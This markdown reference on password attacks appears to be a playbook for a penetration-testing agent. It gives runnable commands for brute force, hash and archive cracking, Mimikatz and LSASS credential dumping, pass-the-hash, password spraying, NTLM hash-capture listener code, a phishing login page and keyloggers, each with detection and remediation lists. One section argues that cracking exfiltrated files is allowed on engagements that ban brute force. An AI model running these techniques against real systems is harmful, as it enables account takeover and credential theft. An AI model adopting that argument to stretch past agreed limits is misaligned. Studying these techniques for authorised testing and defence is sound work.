# Password Attacks Reference

## Overview
Password attacks attempt to gain unauthorized access by compromising authentication credentials through various methods including brute force, dictionary attacks, hash cracking, and credential theft.

**MITRE ATT&CK**: T1110 (Brute Force), T1555 (Credentials from Password Stores), T1003 (OS Credential Dumping)

---

## Brute Force Attacks

### Description
Systematically attempting all possible password combinations until the correct one is found.

### Attack Types
- **Online Brute Force**: Direct authentication attempts
- **Offline Brute Force**: Attacking captured hashes
- **Hybrid Attacks**: Combining dictionary words with modifications

### Tools
- Hydra (online attacks)
- Medusa (parallel brute forcing)
- Ncrack (network authentication)
- Patator (modular brute forcer)
- Burp Suite Intruder

### Testing Methodology
1. Identify authentication mechanisms
2. Determine account lockout policies
3. Create targeted username list
4. Select appropriate wordlist
5. Configure rate limiting/delays
6. Execute attack with monitoring
7. Document successful credentials

### Example Commands
```bash
# Hydra SSH
hydra -L users.txt -P passwords.txt ssh://target.com

# Hydra HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Hydra FTP
hydra -L users.txt -P passwords.txt ftp://target.com

# Medusa
medusa -h target.com -U users.txt -P passwords.txt -M ssh

# Ncrack
ncrack -p 22 -U users.txt -P passwords.txt target.com

# Patator (versatile)
patator ssh_login host=target.com user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

### Rate Limiting Considerations
```bash
# Add delays to avoid detection/lockout
hydra -L users.txt -P passwords.txt -t 4 -w 30 ssh://target.com
# -t 4: 4 parallel connections
# -w 30: 30 second wait between attempts
```

### Detection Methods
- Failed login attempt monitoring
- Account lockout mechanisms
- Rate limiting
- CAPTCHA implementation
- IP-based blocking
- Behavioral analysis

### Remediation
- Implement account lockout policies
- Use multi-factor authentication (MFA)
- Enforce strong password policies
- Implement rate limiting
- Use CAPTCHA for web forms
- Monitor for brute force patterns
- Implement IP-based restrictions

### References
- **MITRE ATT&CK**: T1110.001 (Password Guessing)
- **CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **OWASP**: Authentication Failure (A07:2021)
- **CAPEC**: CAPEC-49 (Password Brute Forcing)

---

## Dictionary Attacks

### Description
Using pre-compiled lists of common passwords and variants to authenticate.

### Common Wordlists
- **rockyou.txt**: 14+ million passwords from breach
- **SecLists**: Comprehensive password lists
- **CrackStation**: Massive wordlist compilation
- **Custom lists**: Target-specific wordlists

### Tools
- Same as brute force (Hydra, Medusa, etc.)
- CeWL (custom wordlist generator)
- Crunch (pattern-based wordlist generator)
- CUPP (user-profiling wordlist generator)

### Testing Methodology
1. Gather intelligence about target (OSINT)
2. Generate custom wordlists
3. Combine common passwords with variations
4. Apply password mutation rules
5. Execute dictionary attack
6. Try leaked credential databases

### Wordlist Generation
```bash
# CeWL - Spider website for words
cewl -d 2 -m 5 -w wordlist.txt https://target.com

# Crunch - Generate patterns
crunch 8 8 -t pass%%%% -o wordlist.txt
# Generates: pass0000, pass0001, ..., pass9999

# CUPP - Interactive profile-based
python3 cupp.py -i

# Combine multiple wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Add common mutations
john --wordlist=words.txt --rules --stdout > mutated.txt
```

### Common Password Patterns
```
Company name + year: Company2024
Name + birthdate: John1990
Seasonal: Summer2024!
Keyboard patterns: Qwerty123
Common substitutions: P@ssw0rd
```

### Year Variant Testing from Leaked/Logged Credentials
```bash
# When you find a password in logs, config files, or SMB shares that doesn't authenticate:
# The credential may have been recorded at a different time — try year variants
# Pattern: replace the year component with current year ±2
# Example: "Em3rg3ncyPa$$2025" found in log → try 2024, 2025, 2026, 2027
# Also try: dollar signs ($→S), common leet swaps, capitalization variants
# Automated: generate variants and spray
for year in $(seq 2022 2027); do echo "${base_password/2025/$year}"; done > variants.txt
nxc smb DC_IP -u username -p variants.txt --no-bruteforce
# Common in: IdentitySync logs, service config traces, old backup scripts, EventViewer exports
```

### Detection Methods
- Monitor failed login attempts
- Detect common password patterns
- Implement password complexity requirements
- Use breach password databases
- Behavioral authentication analysis

### Remediation
- Block common/breached passwords
- Enforce password complexity
- Implement MFA
- Use password managers
- Regular security awareness training
- Monitor for credential stuffing

### References
- **MITRE ATT&CK**: T1110.002 (Password Cracking)
- **CWE**: CWE-521 (Weak Password Requirements)
- **Resources**:
  - SecLists: https://github.com/danielmiessler/SecLists
  - Have I Been Pwned: https://haveibeenpwned.com/

---

## Hash Cracking

### Description
Recovering plaintext passwords from captured password hashes using various cracking techniques.

### Hash Types
- **MD5**: Fast, widely used (insecure)
- **SHA-1/SHA-256**: Cryptographic hashes
- **NTLM**: Windows password hashes
- **bcrypt/scrypt**: Adaptive hashing (slower)
- **NetNTLMv2**: Network authentication
- **Kerberos**: Kerberoast hashes

### Tools
- Hashcat (GPU-accelerated)
- John the Ripper (CPU-based)
- hash-identifier (identify hash types)
- hashid (Python hash identifier)

### Testing Methodology
1. Capture/extract password hashes
2. Identify hash type
3. Select cracking mode (dictionary, brute force, mask, hybrid)
4. Configure attack parameters
5. Execute cracking
6. Analyze results

### Hashcat Examples
```bash
# Identify hash type
hashcat --example | grep -i ntlm
hashid hash.txt

# Dictionary attack
hashcat -m 1000 -a 0 hashes.txt wordlist.txt

# Dictionary + rules
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# Brute force
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
# ?a = all characters

# Mask attack (known pattern)
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?d?d?d?d
# ?u=uppercase, ?l=lowercase, ?d=digit
# Pattern: Abcd1234

# Combinator attack
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Hybrid attack (wordlist + mask)
hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d?d?d

# Resume session
hashcat --session mysession --restore

# Show cracked passwords
hashcat -m 1000 hashes.txt --show
```

### John the Ripper Examples
```bash
# Auto-detect format and crack
john hashes.txt

# Specify format
john --format=NT hashes.txt

# Dictionary attack
john --wordlist=rockyou.txt hashes.txt

# With rules
john --wordlist=words.txt --rules hashes.txt

# Incremental (brute force)
john --incremental hashes.txt

# Show cracked
john --show hashes.txt

# Resume interrupted session
john --restore
```

### Common Hash Formats (Hashcat -m values)
```
0     = MD5
100   = SHA1
1000  = NTLM
1400  = SHA-256
1700  = SHA-512
1800  = sha512crypt (Linux)
3000  = LM
5600  = NetNTLMv2
13100 = Kerberos 5 TGS-REP (Kerberoasting)
13400 = KeePass 1/2 (KDBX) master password
13600 = WinZIP (PKZIP-classic ZIP encryption)
16900 = Ansible Vault
17200 = PKZIP (compressed)
17225 = PKZIP (mixed-multi-file)
17220 = PKZIP (uncompressed)
17210 = PKZIP (uncompressed, mixed)
18200 = Kerberos 5 AS-REP (AS-REP Roasting)
24410 = PKCS#12 PBES2 (PFX) - hashcat
24420 = PKCS#12 PBE (SHA1-3DES, RC2-40) - hashcat
```

### Encrypted Credential Container Cracking (ZIP, 7z, PFX, KDBX)
Cracking an encrypted file you've already exfiltrated from a share is offline crypto
on data you possess — NOT credential brute force against a live login. It's allowed
even on engagements that ban brute force. Workflow for the formats most often seen:

```bash
# ZIP (legacy ZipCrypto or AES) — the format used by `winrm_backup.zip`-style files
zip2john backup.zip > zip.hash         # creates a $zip2$* line
john --wordlist=rockyou.txt zip.hash
# Or hashcat: identify mode (-m 13600/17200/17220/17225 depending on compression)

# 7-Zip
7z2john.pl secret.7z > 7z.hash
john --wordlist=rockyou.txt 7z.hash

# PFX / PKCS#12 (certificate + private key, password-protected)
pfx2john.py legacy.pfx > pfx.hash
# !!! pfx2john.py (the Python port shipping with john-jumbo) emits hashes wrapped
# in Python b'…' byte-string syntax — john rejects them silently with
# "No password hashes loaded". Strip the wrappers before cracking:
sed -i -E "s/b'\\\\x([0-9a-f]{2})'/\\\\x\\1/g; s/b'([^']*)'/\\1/g" pfx.hash
john --wordlist=rockyou.txt pfx.hash
# (If your sed dialect rejects the regex, the simpler workaround is to hex-decode
#  the b'\xNN' bytes inline in Python, then write the cleaned hash to a file.)

# Once cracked, split the PFX into PEM cert + PEM key (no password on output):
openssl pkcs12 -in legacy.pfx -nocerts -out key.pem -nodes -passin pass:<phrase>
openssl pkcs12 -in legacy.pfx -clcerts -nokeys -out cert.pem -passin pass:<phrase>
# These pem files plug directly into evil-winrm cert auth (see WinRM section).

# KeePass (.kdbx) — when you find a database in a share/profile
keepass2john secrets.kdbx > kdbx.hash
john --wordlist=rockyou.txt kdbx.hash       # or hashcat -m 13400

# Firefox — saved-form passwords, no master password (default install)
# Files needed (collect ALL THREE from the user's profile dir):
#   key4.db        — encryption key store (replaces older key3.db)
#   cert9.db       — NSS cert DB (some versions need this present)
#   logins.json    — encrypted credential records
# Profile path: %APPDATA%\Mozilla\Firefox\Profiles\<random>.default-release\
# Linux:        ~/.mozilla/firefox/<random>.default-release/
# Decrypt offline (no cracking — Firefox stores creds AES-encrypted under a
# key derived from the master password; default master is empty, so this is
# a deterministic decrypt, not a brute force):
git clone https://github.com/unode/firefox_decrypt /opt/firefox_decrypt
python3 /opt/firefox_decrypt/firefox_decrypt.py /tmp/profile/
# Output: cleartext URL + username + password for every saved login.
# These passwords frequently match the user's AD password (cred reuse) — try them
# against SMB/WinRM/LDAP before assuming the only path is more enumeration.

# Ansible Vault — when you find playbooks (*.yml/yaml) on a share, the
# real credentials are NOT in `inventory` files (those values like
# admin/Welcome1 are template placeholders — DO NOT spray them as live
# AD creds). Real secrets live as `!vault` blocks inside `defaults/main.yml`,
# `group_vars/*.yml`, `host_vars/*.yml`, or any role's `vars/main.yml`.
# Format on disk:
#   password: !vault |
#     $ANSIBLE_VAULT;1.1;AES256
#     35663...                    # hex ciphertext, multi-line
#
# Step 1 — extract every $ANSIBLE_VAULT block from the spidered share:
grep -rEzo '\$ANSIBLE_VAULT;1\.1;AES256\n([0-9a-f]+\n)+' ./share/playbooks/ > vault.txt
# Step 2 — convert to john format and crack:
ansible2john vault.txt > vault.hash
john --wordlist=rockyou.txt vault.hash      # hashcat -m 16900
# Step 3 — decrypt with the recovered passphrase:
ansible-vault decrypt vault.txt --vault-password-file <(echo 'CRACKED_PWD')
# The cleartext is usually the AD service-account password backing PWM,
# Ansible Tower, AWX, or whatever automation the playbook drives.
```

**Run john + hashcat in parallel** for short jobs (AS-REP, Kerberoast, ZIP, PFX):
john (CPU) often finishes first because hashcat pays a per-run kernel-compile cost.
For long jobs (large dictionaries, mask attacks) hashcat overtakes — but you don't
know in advance which it is, so launching both is free insurance:
```bash
john --wordlist=rockyou.txt foo.hash &
hashcat -m <mode> foo.hash rockyou.txt &
wait
```

### WinRM with Cert-Based Authentication (PFX → 5986)
When SMB share enumeration produces a `.pfx` (or unrelated `cert.pem`+`key.pem`) and
WinRM HTTP (5985) is closed/filtered, ALWAYS check 5986 (HTTPS WinRM) before assuming
WinRM is unavailable. WinRM-HTTPS supports client-certificate authentication mapped
to a domain or local user — the certificate Subject (CN/UPN) identifies the principal,
no username/password is required.
```bash
# After splitting PFX into key.pem + cert.pem (above):
evil-winrm -S -c cert.pem -k key.pem -i <DC_IP>
# -S = SSL/HTTPS (port 5986), -c cert -k key = client-cert auth.

# Verify 5986 is reachable first:
nmap -p 5985,5986 -sV <IP>
# If 5985 filtered/closed but 5986 open → cert-auth foothold is the most likely path.
```

### Cracking Strategies
1. **Quick wins**: Common passwords first
2. **Smart wordlists**: Targeted, context-aware
3. **Rules**: Apply mutations to wordlists
4. **Masks**: Known password patterns
5. **Hybrid**: Combine techniques
6. **GPU acceleration**: Significant speed boost

### Detection Methods
- Monitor for credential dumping
- Detect hash extraction tools
- Implement strong hashing algorithms
- Use salting and key stretching

### Remediation
- Use adaptive hashing (bcrypt, Argon2)
- Implement proper salting
- Increase work factors
- Enforce strong password policies
- Monitor for credential dumps
- Use MFA

### References
- **MITRE ATT&CK**: T1110.002 (Password Cracking)
- **CWE**: CWE-916 (Use of Password Hash With Insufficient Computational Effort)
- **Hashcat**: https://hashcat.net/hashcat/
- **John**: https://www.openwall.com/john/

---

## Credential Dumping

### Description
Extracting credentials from memory, files, or system storage.

### Windows Credential Dumping

**Tools**:
- Mimikatz (memory credential extraction)
- LaZagne (browser/application passwords)
- ProcDump + Mimikatz (LSASS dumping)
- Secretsdump.py (Impacket)

**Techniques**:
```powershell
# Mimikatz - Extract from memory
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
lsadump::secrets

# Dump LSASS without Mimikatz
procdump.exe -ma lsass.exe lsass.dmp
# Then offline: mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"

# Task Manager method
# Right-click lsass.exe -> Create dump file

# Registry dumps (SAM, SYSTEM, SECURITY)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# Extract with secretsdump
secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL

# LaZagne
.\laZagne.exe all

# Extract Chrome passwords
.\SharpChrome.exe
```

### Linux Credential Dumping

**Techniques**:
```bash
# Password hashes
cat /etc/shadow

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# Browser credentials
~/.mozilla/firefox/*.default/logins.json
~/.config/google-chrome/Default/Login Data

# Bash history (may contain passwords)
cat ~/.bash_history
cat ~/.zsh_history

# Configuration files
grep -r "password" /home 2>/dev/null
grep -r "pass" /etc/*.conf 2>/dev/null

# Process memory dumping
gcore <pid>
strings core.<pid> | grep -i pass
```

### Network Credential Capture

**Tools**:
- Responder (LLMNR/NBT-NS poisoning)
- Inveigh (PowerShell Responder)
- Ettercap (MitM)

**Techniques**:
```bash
# Responder
responder -I eth0 -wrf

# Inveigh
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y

# Capture traffic
tcpdump -i eth0 -w capture.pcap port 21 or port 23
# Analyze with Wireshark for credentials
```

**Custom HTTP NTLM capture listener — required pieces for modern Windows clients**

When DNS poisoning / WPAD / a SSRF redirects an authenticated Windows client to
your HTTP listener, a *naive* `BaseHTTPRequestHandler` listener fails: the client
sends Type 1 (NEGOTIATE), but never returns Type 3 (AUTHENTICATE). Two reasons:

1. **HTTP/1.0 closes between Type 1 → Type 2 → Type 3.** NTLM is connection-bound
   (the server-side state for the challenge lives on the TCP connection). A
   single-shot HTTP/1.0 response forces a new TCP connection for the AUTHENTICATE
   round-trip, which the server has no state for. Required:
   ```python
   from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
   class H(BaseHTTPRequestHandler):
       protocol_version = "HTTP/1.1"     # MANDATORY — keep-alive across the 3 messages
       # On the 401 challenge response, also set:
       #   self.send_header('Content-Length', '0')
       #   self.send_header('Connection', 'Keep-Alive')
   ```
2. **Static / hardcoded Type 2 challenge with wrong NEGOTIATE flags causes RST.**
   Modern clients (PowerShell `Invoke-WebRequest`, .NET `HttpClient`, IE/Edge in
   intranet zone) inspect the server's NTLMSSP flags and tear the connection if
   they don't intersect the client's offered flags. Build the Type 2 dynamically:
   - Parse the client's Type 1, extract its NEGOTIATE flags, and **echo** them back.
   - Add: `NTLMSSP_NEGOTIATE_NTLM | NEGOTIATE_TARGET_INFO | TARGET_TYPE_DOMAIN |
     NEGOTIATE_UNICODE | NEGOTIATE_ALWAYS_SIGN | NEGOTIATE_EXTENDED_SESSIONSECURITY |
     NEGOTIATE_VERSION`.
   - Type 2 MUST include AV pairs in TargetInfo:
     `MsvAvNbDomainName=2`, `MsvAvNbComputerName=1`, `MsvAvDnsDomainName=4`,
     `MsvAvDnsComputerName=3`, `MsvAvTimestamp=7`, `MsvAvEOL=0`. Without these,
     the client either doesn't compute NTLMv2 or refuses to send Type 3.

**Advertise BOTH Negotiate and NTLM** so the client picks the one its current
context supports — PowerShell `Invoke-WebRequest -UseDefaultCredentials` in
particular will only drive the dance if `Negotiate` is offered:
```python
self.send_response(401)
self.send_header('WWW-Authenticate', 'Negotiate')
self.send_header('WWW-Authenticate', 'NTLM')
self.send_header('Content-Length', '0')
self.send_header('Connection', 'Keep-Alive')
self.end_headers()
```

Once the Type 3 message arrives, extract the NetNTLMv2 hash:
`username::domain:server_challenge:NTProofStr:blob` and crack with `hashcat -m 5600`.

A reference implementation lives at
`skills/authentication/reference/ntlm-http-listener.py` (use it as a template;
audit/replace constants for your engagement).

### Detection Methods
- Monitor LSASS access
- Detect Mimikatz signatures
- Alert on SAM/SYSTEM registry access
- Monitor credential access APIs
- Implement Credential Guard
- Use EDR solutions

### Remediation
- Implement Credential Guard
- Use Protected Process Light (PPL) for LSASS
- Limit local admin accounts
- Use LAPS (Local Administrator Password Solution)
- Implement just-in-time admin access
- Clear credentials from memory
- Monitor suspicious process access

### References
- **MITRE ATT&CK**: T1003 (OS Credential Dumping)
- **CWE**: CWE-522 (Insufficiently Protected Credentials)
- **Tools**: https://github.com/gentilkiwi/mimikatz
- **CAPEC**: CAPEC-191 (Read Sensitive Constants Within Memory)

---

## Pass-the-Hash (PtH)

### Description
Using NTLM hashes directly for authentication without cracking them.

### Tools
- Impacket suite (psexec.py, wmiexec.py, smbexec.py)
- CrackMapExec
- Metasploit
- Mimikatz

### Testing Methodology
1. Obtain NTLM hashes (via Mimikatz, secretsdump)
2. Identify target systems
3. Attempt authentication with hash
4. Execute commands if successful

### Example Commands
```bash
# Impacket psexec
psexec.py -hashes :ntlmhash administrator@target.com

# Impacket wmiexec
wmiexec.py -hashes :ntlmhash administrator@target.com

# Impacket smbexec
smbexec.py -hashes :ntlmhash administrator@target.com

# CrackMapExec
crackmapexec smb target.com -u administrator -H ntlmhash
crackmapexec smb target.com -u administrator -H ntlmhash -x "whoami"

# Metasploit
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass ntlmhash
set RHOSTS target
exploit
```

### Mimikatz Pass-the-Hash
```powershell
# Pass-the-hash
sekurlsa::pth /user:administrator /domain:domain.com /ntlm:hash /run:cmd.exe

# Then use commands in spawned shell
dir \\target\c$
psexec \\target cmd
```

### Detection Methods
- Monitor for lateral movement
- Detect NTLM authentication patterns
- Enable Windows logging (4624, 4625, 4648)
- Use Security Information and Event Management (SIEM)
- Behavioral analysis

### Remediation
- Disable NTLM authentication where possible
- Use Kerberos authentication
- Implement Protected Users group
- Use Credential Guard
- Implement tiered administration
- Restrict local admin accounts
- Monitor lateral movement

### References
- **MITRE ATT&CK**: T1550.002 (Pass the Hash)
- **CWE**: CWE-294 (Authentication Bypass by Capture-replay)
- **Microsoft**: https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/

---

## Password Spraying

### Description
Attempting a small number of common passwords against many user accounts to avoid account lockouts.

### Strategy
- Use 1-3 common passwords
- Target all users
- Wait between attempts (respect lockout policy)
- Common passwords: Password1, Company2024, Season+Year

### Tools
- CrackMapExec
- Spray (DomainPasswordSpray.ps1)
- Hydra
- Custom scripts

### Testing Methodology
1. Enumerate valid usernames
2. Identify account lockout policy
3. Select 1-3 common passwords
4. Calculate safe delay between attempts
5. Execute spray attack
6. Document successful authentications

### Example Commands
```bash
# CrackMapExec password spray
crackmapexec smb target.com -u users.txt -p 'Password123' --continue-on-success

# DomainPasswordSpray
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Summer2024!

# Custom spray with delay
for user in $(cat users.txt); do
  hydra -l $user -p 'Password123!' target.com http-post-form "/login:user=^USER^&pass=^PASS^:Failed"
  sleep 1800  # 30 minute delay
done

# Office 365 spray
.\MSOLSpray.ps1 -UserList users.txt -Password 'Summer2024!'
```

### Account Lockout Considerations
```
Example policy: 5 failed attempts, 30-minute lockout
Safe approach: 1-2 attempts per 30-60 minutes
Timing: Spread over hours/days to avoid detection
```

### Detection Methods
- Monitor failed login patterns
- Detect multiple users with same password attempt
- Anomaly detection in authentication logs
- Time-based pattern recognition
- Failed login velocity monitoring

### Remediation
- Implement MFA
- Use adaptive authentication
- Monitor for spray patterns
- Block common passwords
- Implement conditional access
- User education on password security

### References
- **MITRE ATT&CK**: T1110.003 (Password Spraying)
- **CWE**: CWE-307
- **CAPEC**: CAPEC-565 (Password Spraying)

---

## Credential Stuffing

### Description
Using credentials obtained from breaches to attempt authentication on other services.

### Attack Process
1. Obtain breach credential lists
2. Target specific service/platform
3. Attempt authentication with leaked credentials
4. Identify successful logins
5. Account takeover

### Tools
- Sentry MBA
- SNIPR
- OpenBullet
- Custom automation scripts

### Data Sources
- Public breach databases
- Dark web marketplaces
- Pastebin dumps
- Previous compromises

### Testing Methodology
1. Identify credential breach databases
2. Extract relevant credentials
3. Format for target service
4. Configure tool/script
5. Implement rate limiting
6. Execute attack
7. Document successful accounts

### Detection Methods
- Anomalous login locations
- Multiple failed login attempts
- Credential breach monitoring
- Behavioral analytics
- Device fingerprinting
- Velocity checks

### Remediation
- Implement MFA
- Monitor breach databases
- Force password resets for breached credentials
- Use bot detection
- Implement CAPTCHA
- Rate limiting
- Geographic restrictions
- Device fingerprinting

### References
- **MITRE ATT&CK**: T1110.004 (Credential Stuffing)
- **CWE**: CWE-262 (Not Using Password Aging)
- **OWASP**: Credential Stuffing Prevention Cheat Sheet
- **Resources**: Have I Been Pwned API

---

## Phishing for Credentials

### Description
Social engineering attacks to trick users into providing credentials.

### Phishing Types
- **Email Phishing**: Malicious emails
- **Spear Phishing**: Targeted attacks
- **Whaling**: Targeting executives
- **Smishing**: SMS phishing
- **Vishing**: Voice phishing

### Tools
- Gophish (phishing framework)
- Social Engineering Toolkit (SET)
- King Phisher
- CredSniper
- Evilginx2 (reverse proxy phishing)

### Testing Methodology
1. Identify targets
3. Create convincing pretext
4. Clone legitimate login pages
5. Send phishing emails
6. Capture credentials
7. Analyze success rate
8. Provide security awareness training

### Example Setup
```bash
# Gophish
./gophish

# SET (Social Engineering Toolkit)
setoolkit
# Select: Website Attack Vectors
# Select: Credential Harvester Attack Method
# Select: Site Cloner

# Evilginx2 (reverse proxy)
./evilginx2 -p phishlets/
lures create office365
lures get-url 0
```

### Credential Harvesting Page
```html
<!-- Basic phishing page structure -->
<!DOCTYPE html>
<html>
<head><title>Login - Company Portal</title></head>
<body>
<form action="capture.php" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
</body>
</html>
```

### Detection Methods
- Email filtering and analysis
- Link analysis
- Domain reputation
- User reporting
- Security awareness training effectiveness
- Monitor for cloned websites

### Remediation
- Security awareness training
- Email authentication (SPF, DKIM, DMARC)
- Anti-phishing tools
- MFA implementation
- URL filtering
- Simulated phishing exercises
- Reporting mechanisms

### References
- **MITRE ATT&CK**: T1566 (Phishing)
- **CWE**: CWE-1390 (Weak Authentication)
- **OWASP**: Phishing
- **Resources**: https://www.getgophish.com/

---

## Keylogging

### Description
Capturing keystrokes to obtain passwords and sensitive information.

### Types
- **Software keyloggers**: Installed programs
- **Hardware keyloggers**: Physical devices
- **Kernel-level keyloggers**: OS-level capture
- **Web-based keyloggers**: JavaScript capture

### Tools
- Metasploit keylogger (Meterpreter)
- PowerSploit (Get-Keystrokes)
- Custom scripts
- Commercial keyloggers (for testing)

### Testing Methodology
1. Deploy keylogger (software or hardware)
3. Configure logging/transmission
4. Monitor captured data
5. Analyze for credentials
6. Securely delete captured data

### Meterpreter Keylogger
```bash
# In meterpreter session
keyscan_start
# Wait for activity
keyscan_dump
keyscan_stop
```

### PowerShell Keylogger
```powershell
# Get-Keystrokes.ps1
Import-Module .\Get-Keystrokes.ps1
Get-Keystrokes -LogPath C:\temp\keys.log
```

### Detection Methods
- Anti-keylogger software
- Behavioral analysis
- Process monitoring
- USB device control
- Virtual keyboard for sensitive input
- EDR solutions

### Remediation
- Endpoint protection software
- Application whitelisting
- USB device control
- Virtual keyboards for sensitive operations
- Regular security scans
- User awareness training
- Implement EDR

### References
- **MITRE ATT&CK**: T1056.001 (Keylogging)
- **CWE**: CWE-200 (Exposure of Sensitive Information)
- **CAPEC**: CAPEC-568 (Capture Credentials via Keylogger)

---

## Database Password Hash Cracking (Lateral Movement)

**When to use:** After obtaining database access (via LFI config read, SQLi, exposed .env), extract user password hashes from the application database, crack them, and test for password reuse on system accounts (SSH, su).

**Workflow:**
1. **Extract hashes** — query the users table: `SELECT username, email, password FROM users`
2. **Identify hash type** — bcrypt (`$2y$`, `$2a$`, `$2b$`), Argon2 (`$argon2id$`), SHA-256/512, MD5
3. **Crack with appropriate tool** — bcrypt: `john --wordlist=rockytu.txt hashes.txt` (~30 hashes/sec on CPU — slow). For faster results: use targeted wordlists first (keyboard patterns, app-themed words)
4. **Test password reuse** — try cracked passwords for SSH login (`sshpass -p 'PASS' ssh user@target`) and `su` from existing shell (`echo 'PASS' | su -c 'id' USERNAME`)
5. **Common keyboard pattern passwords** — `!QAZ2wsx`, `1qaz2wsx`, `!QAZ@WSX`, `3edc4rfv`, `1qaz2wsx3edc` (keyboard column walks)
6. **After lateral movement** — check `sudo -l` for the new user — even with restrictions like `targetpw`, having `(ALL) ALL` opens escalation paths

### Application Config File Hash Extraction

FTP servers, web admin panels, and CMS platforms store per-user credentials in XML/config files outside the database. Search for them:
```bash
find /opt /etc /var -name "*.xml" -path "*/users/*" 2>/dev/null
find /opt /etc /var -name "*.ini" -path "*/conf/*" 2>/dev/null
```
Common formats: `<Password>HASH</Password>` with `<PasswordSalt>SALT</PasswordSalt>` (salted SHA-256), or `<hash>BCRYPT_HASH</hash>`. Crack salted SHA-256: `hashcat -m 1410 'hash:salt' rockytu.txt`. These are often admin credentials with password reuse on SSH/system accounts.
